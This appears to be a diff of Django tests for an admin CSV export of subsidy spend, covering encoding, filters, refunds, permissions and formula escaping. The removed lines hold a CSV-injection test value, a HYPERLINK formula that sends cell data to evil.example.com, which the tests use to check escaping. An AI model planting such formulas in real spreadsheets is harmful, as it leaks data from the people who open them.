@@ -2,6 +2,8 @@
 Tests for the v2 transaction views.
 """
 import csv
+import io
+import json
 import urllib
 import uuid
 from datetime import datetime, timedelta, timezone
@@ -1040,21 +1042,26 @@ class TransactionAdminExportViewTests(APITestMixin):
         rows = []
         if response.status_code == status.HTTP_200_OK:
             content = b''.join(response.streaming_content).decode('utf-8-sig')
-            rows = list(csv.DictReader(content.splitlines()))
+            rows = list(csv.DictReader(io.StringIO(content, newline='')))
         return response, rows
 
     def test_admin_exports_csv(self):
+        """A download client may ask for text/csv; the file starts with a BOM so Excel reads non-ASCII as UTF-8."""
+        self.spend.content_title = 'Introducción a la programación'
+        self.spend.save()
         self.set_up_admin()
 
-        response, rows = self._export()
+        response = self.client.get(self._url(), HTTP_ACCEPT='text/csv')
+        content = b''.join(response.streaming_content)
 
         assert response.status_code == status.HTTP_200_OK
         assert response['Content-Type'] == 'text/csv; charset=utf-8'
         assert response['Content-Disposition'] == f'attachment; filename="spent_report_{self.subsidy.uuid}.csv"'
-        assert rows == [{
+        assert content.startswith('\ufeff'.encode('utf-8'))
+        assert list(csv.DictReader(io.StringIO(content.decode('utf-8-sig'), newline=''))) == [{
             'Learner Email': self.lms_user_email,
             'Learner ID': str(STATIC_LMS_USER_ID),
-            'Course Title': self.content_title,
+            'Course Title': 'Introducción a la programación',
             'Course Key': self.content_key,
             'Date Spent (UTC)': '2024-01-10 15:30:00',
             'Amount Spent': '10.50',
@@ -1063,49 +1070,26 @@ class TransactionAdminExportViewTests(APITestMixin):
             'Policy UUID': str(self.policy_uuid),
         }]
 
-    def test_file_starts_with_utf8_bom_and_keeps_non_ascii_text(self):
-        """Excel needs the BOM to read the file as UTF-8 rather than garbling non-ASCII course titles."""
-        self.spend.content_title = 'Introducción a la programación'
-        self.spend.save()
-        self.set_up_admin()
-
-        response = self.client.get(self._url())
-        content = b''.join(response.streaming_content)
-
-        assert content.startswith('\ufeff'.encode('utf-8'))
-        assert 'Introducción a la programación' in content.decode('utf-8-sig')
-
-    def test_only_committed_learner_spend_is_exported(self):
-        """
-        Deposits (including the starting balance), adjustments, and non-committed transactions are ledger transactions
-        too, but aren't learner spend.
-        """
+    def test_only_committed_spend_unpaginated_newest_first_with_refunds(self):
+        """Only committed spend, unpaginated and newest first; only a committed reversal is a refund."""
         DepositFactory(ledger=self.subsidy.ledger, desired_deposit_quantity=50000)
         AdjustmentFactory(ledger=self.subsidy.ledger, adjustment_quantity=-2000)
         for state in (TransactionStateChoices.CREATED, TransactionStateChoices.PENDING, TransactionStateChoices.FAILED):
-            self._create_spend(state=state, content_title=f'{state} course')
+            self._create_spend(state=state)
+        refunded = self._create_spend(quantity=-250, created=datetime(2024, 1, 12, tzinfo=timezone.utc))
+        ReversalFactory(transaction=refunded, state=TransactionStateChoices.COMMITTED, quantity=250)
+        pending_reversal = self._create_spend(created=datetime(2024, 1, 11, tzinfo=timezone.utc))
+        ReversalFactory(transaction=pending_reversal, state=TransactionStateChoices.PENDING, quantity=1000)
+        for _ in range(30):
+            self._create_spend(created=datetime(2023, 1, 1, tzinfo=timezone.utc))
         self.set_up_admin()
 
         _, rows = self._export()
 
-        assert [row['Course Title'] for row in rows] == [self.content_title]
-
-    def test_unpaginated_newest_first_and_refunds_marked(self):
-        reversed_spend = self._create_spend(
-            quantity=-250, content_title='Reversed Course', created=datetime(2024, 1, 11, tzinfo=timezone.utc),
-        )
-        ReversalFactory(transaction=reversed_spend, state=TransactionStateChoices.COMMITTED, quantity=250)
-        for number in range(30):
-            self._create_spend(content_title=f'Extra {number}', created=datetime(2023, 1, 1, tzinfo=timezone.utc))
-        self.set_up_admin()
-
-        _, rows = self._export()
-
-        assert len(rows) == 32
-        assert rows[0]['Course Title'] == 'Reversed Course'
-        assert rows[0]['Amount Spent'] == '2.50'
-        assert rows[0]['Status'] == 'Refunded'
-        assert rows[1]['Course Title'] == self.content_title
+        assert len(rows) == 33
+        assert [(row['Amount Spent'], row['Status']) for row in rows[:3]] == [
+            ('2.50', 'Refunded'), ('10.00', 'Committed'), ('10.50', 'Committed'),
+        ]
 
     @ddt.data(
         # The end date is inclusive of the whole day: a 15:30 spend on the end date is included.
@@ -1130,36 +1114,16 @@ class TransactionAdminExportViewTests(APITestMixin):
             assert [row['Course Title'] for row in rows] == [self.content_title]
 
     def test_policy_and_search_filters(self):
+        """``search`` matches the learner email as well as the course title."""
         self._create_spend(subsidy_access_policy_uuid=uuid.uuid4(), content_title='Other budget')
-        self._create_spend(content_title='Other search', lms_user_email='someone@example.com')
+        self._create_spend(content_title='Other search', lms_user_email='findme@example.com')
         self.set_up_admin()
 
         _, rows = self._export(subsidy_access_policy_uuid=self.policy_uuid, search=self.content_title)
+        _, email_rows = self._export(search='findme@example.com')
 
         assert [row['Course Title'] for row in rows] == [self.content_title]
-
-    def test_search_matches_learner_email_as_well_as_course_title(self):
-        """``search_fields`` covers lms_user_email too, not just content_title."""
-        self._create_spend(content_title='Unrelated course', lms_user_email='findme@example.com')
-        self.set_up_admin()
-
-        _, rows = self._export(search='findme@example.com')
-
-        assert [row['Learner Email'] for row in rows] == ['findme@example.com']
-
-    def test_non_committed_reversal_is_not_reported_as_refunded(self):
-        """Only a *committed* reversal means the spend was refunded; a pending one leaves it as spend."""
-        spend = self._create_spend(content_title='Pending reversal course')
-        ReversalFactory(
-            transaction=spend,
-            quantity=-spend.quantity,
-            state=TransactionStateChoices.PENDING,
-        )
-        self.set_up_admin()
-
-        _, rows = self._export(search='Pending reversal course')
-
-        assert [row['Status'] for row in rows] == ['Committed']
+        assert [row['Learner Email'] for row in email_rows] == ['findme@example.com']
 
     @ddt.data(
         {'start_date': 'not-a-date'},
@@ -1169,121 +1133,106 @@ class TransactionAdminExportViewTests(APITestMixin):
         {'subsidy_access_policy_uuid': 'abc'},
         {'enterprise_customer_uuid': 'abc'},
     )
-    def test_invalid_params_return_bad_request(self, params):
+    @mock.patch('enterprise_subsidy.apps.api.v2.views.transaction.logger')
+    def test_invalid_params_return_bad_request(self, params, mock_logger):
+        """Invalid input is refused before the export is recorded as started."""
         self.set_up_admin()
 
         response, _ = self._export(**params)
 
         assert response.status_code == status.HTTP_400_BAD_REQUEST
         assert response['Content-Type'] == 'application/json'
+        mock_logger.info.assert_not_called()
 
-    def test_matching_enterprise_customer_uuid_is_allowed(self):
-        self.set_up_operator()
-
-        response, rows = self._export(enterprise_customer_uuid=self.enterprise_uuid)
-
-        assert response.status_code == status.HTTP_200_OK
-        assert len(rows) == 1
-
-    def test_mismatched_enterprise_customer_uuid_returns_not_found(self):
+    @ddt.data(True, False)
+    def test_enterprise_customer_uuid_must_own_the_subsidy(self, owns_subsidy):
         """All-access callers acting for another enterprise can't read this subsidy."""
         self.set_up_operator()
+        customer_uuid = self.enterprise_uuid if owns_subsidy else uuid.uuid4()
 
-        response, _ = self._export(enterprise_customer_uuid=uuid.uuid4())
+        response = self.client.get(self._url(), {'enterprise_customer_uuid': customer_uuid}, HTTP_ACCEPT='text/csv')
 
-        assert response.status_code == status.HTTP_404_NOT_FOUND
+        if owns_subsidy:
+            assert response.status_code == status.HTTP_200_OK
+        else:
+            # Errors are still JSON for a client that asked for text/csv.
+            assert response.status_code == status.HTTP_404_NOT_FOUND
+            assert 'detail' in json.loads(response.content)
 
-    def test_formula_cells_are_escaped(self):
-        """Learner- and partner-supplied text must not run as a spreadsheet formula."""
-        self.spend.content_title = '=HYPERLINK("https://evil.example.com?"&A1,"Click")'
-        self.spend.lms_user_email = '-2+3@example.com'
-        self.spend.content_key = '@SUM(A1:A2)'
+    @ddt.data('=1+1', '+1', '-1', '@A1', '\tx', '\rx', '\nx')
+    def test_formula_cells_are_escaped(self, value):
+        """Untrusted text must not run as a spreadsheet formula (OWASP CSV injection)."""
+        self.spend.content_title = value
+        self.spend.lms_user_email = value
+        self.spend.content_key = value
         self.spend.save()
         self.set_up_admin()
 
         _, rows = self._export()
 
-        assert rows[0]['Course Title'] == '\'=HYPERLINK("https://evil.example.com?"&A1,"Click")'
-        assert rows[0]['Learner Email'] == "'-2+3@example.com"
-        assert rows[0]['Course Key'] == "'@SUM(A1:A2)"
+        assert rows[0]['Course Title'] == rows[0]['Learner Email'] == rows[0]['Course Key'] == "'" + value
 
-    def test_seats_ledger_amounts_are_not_converted_from_cents(self):
-        seats_subsidy = SubsidyFactory(
-            enterprise_customer_uuid=self.enterprise_uuid, unit=UnitChoices.SEATS, starting_balance=100,
-        )
-        self._create_spend(ledger=seats_subsidy.ledger, quantity=-2)
-        self.set_up_admin()
-
-        _, rows = self._export(subsidy_uuid=seats_subsidy.uuid)
-
-        assert (rows[0]['Amount Spent'], rows[0]['Unit']) == ('2', 'Seats')
-
-    @ddt.data((0, '0.00'), (-1, '0.01'), (-123456789, '1234567.89'), (500, '-5.00'))
+    @ddt.data(
+        (UnitChoices.USD_CENTS, 0, '0.00', 'USD'),
+        (UnitChoices.USD_CENTS, -1, '0.01', 'USD'),
+        (UnitChoices.USD_CENTS, -123456789, '1234567.89', 'USD'),
+        # A positive (credit) quantity shows up as negative spend rather than being hidden.
+        (UnitChoices.USD_CENTS, 500, '-5.00', 'USD'),
+        (UnitChoices.SEATS, -2, '2', 'Seats'),
+    )
     @ddt.unpack
-    def test_usd_amounts_are_exact_and_unexpected_credits_are_visible(self, quantity, expected_amount):
-        """Amounts use exact decimal arithmetic, and a positive (credit) quantity shows up as negative spend."""
-        self.spend.quantity = quantity
-        self.spend.save()
+    def test_amounts(self, unit, quantity, expected_amount, expected_unit):
+        """USD amounts use exact decimal arithmetic; seats are not converted from cents."""
+        subsidy = SubsidyFactory(enterprise_customer_uuid=self.enterprise_uuid, unit=unit, starting_balance=100000)
+        self._create_spend(ledger=subsidy.ledger, quantity=quantity)
         self.set_up_admin()
 
-        _, rows = self._export()
+        _, rows = self._export(subsidy_uuid=subsidy.uuid)
 
-        assert rows[0]['Amount Spent'] == expected_amount
+        assert (rows[0]['Amount Spent'], rows[0]['Unit']) == (expected_amount, expected_unit)
 
-    def test_operator_can_export(self):
-        self.set_up_operator()
-
-        response, rows = self._export()
-
-        assert response.status_code == status.HTTP_200_OK
-        assert len(rows) == 1
-
-    def test_admin_of_another_enterprise_is_forbidden(self):
-        self.set_up_admin(enterprise_uuids=[str(uuid.uuid4())])
-
-        response, _ = self._export()
-
-        assert response.status_code == status.HTTP_403_FORBIDDEN
-
-    def test_learner_is_forbidden(self):
-        self.set_up_learner()
-
-        response, _ = self._export()
-
-        assert response.status_code == status.HTTP_403_FORBIDDEN
-
-    def test_learner_with_only_database_role_is_forbidden(self):
-        """A learner role from a DB assignment (not the JWT) must not be enough to export everyone's spend."""
-        self.set_up_user()
-        self.set_jwt_cookie([])
-        self.assign_explicit_db_feature_role(feature_role=ENTERPRISE_SUBSIDY_LEARNER_ROLE)
+    @ddt.data(
+        ('operator', status.HTTP_200_OK),
+        ('admin_of_another_enterprise', status.HTTP_403_FORBIDDEN),
+        ('learner', status.HTTP_403_FORBIDDEN),
+        # A learner role from a DB assignment (not the JWT) must not be enough to export everyone's spend.
+        ('learner_with_only_database_role', status.HTTP_403_FORBIDDEN),
+        ('unauthenticated', status.HTTP_401_UNAUTHORIZED),
+    )
+    @ddt.unpack
+    def test_access(self, requester, expected_status):
+        if requester == 'operator':
+            self.set_up_operator()
+        elif requester == 'admin_of_another_enterprise':
+            self.set_up_admin(enterprise_uuids=[str(uuid.uuid4())])
+        elif requester == 'learner':
+            self.set_up_learner()
+        elif requester == 'learner_with_only_database_role':
+            self.set_up_user()
+            self.set_jwt_cookie([])
+            self.assign_explicit_db_feature_role(feature_role=ENTERPRISE_SUBSIDY_LEARNER_ROLE)
 
         response, _ = self._export()
 
-        assert response.status_code == status.HTTP_403_FORBIDDEN
+        assert response.status_code == expected_status
 
-    def test_unauthenticated_request_is_unauthorized(self):
-        response, _ = self._export()
-
-        assert response.status_code == status.HTTP_401_UNAUTHORIZED
-
-    def test_nonexistent_subsidy_is_forbidden(self):
-        """Matches the admin list: there's no customer to check permissions against."""
+    @ddt.data(
+        # Matches the admin list: there's no customer to check permissions against.
+        (str(uuid.uuid4()), status.HTTP_403_FORBIDDEN),
+        # The uuid route converter answers 404; a plain one would let the lookup raise a ValidationError (500).
+        ('abc', status.HTTP_404_NOT_FOUND),
+    )
+    @ddt.unpack
+    def test_unknown_or_malformed_subsidy(self, subsidy_uuid, expected_status):
         self.set_up_admin()
 
-        response, _ = self._export(subsidy_uuid=uuid.uuid4())
+        response = self.client.get(f'/api/v2/subsidies/{subsidy_uuid}/admin/transactions/export/')
 
-        assert response.status_code == status.HTTP_403_FORBIDDEN
+        assert response.status_code == expected_status
 
-    def test_malformed_subsidy_uuid_is_not_found(self):
-        self.set_up_admin()
-
-        response = self.client.get('/api/v2/subsidies/abc/admin/transactions/export/')
-
-        assert response.status_code == status.HTTP_404_NOT_FOUND
-
-    @ddt.data('post', 'put', 'patch', 'delete')
+    @ddt.data('head', 'post', 'put', 'patch', 'delete')
     def test_other_methods_are_not_allowed(self, method):
+        """HEAD included: DRF would otherwise run a whole export for it."""
         self.set_up_admin()
 
         response = getattr(self.client, method)(self._url())
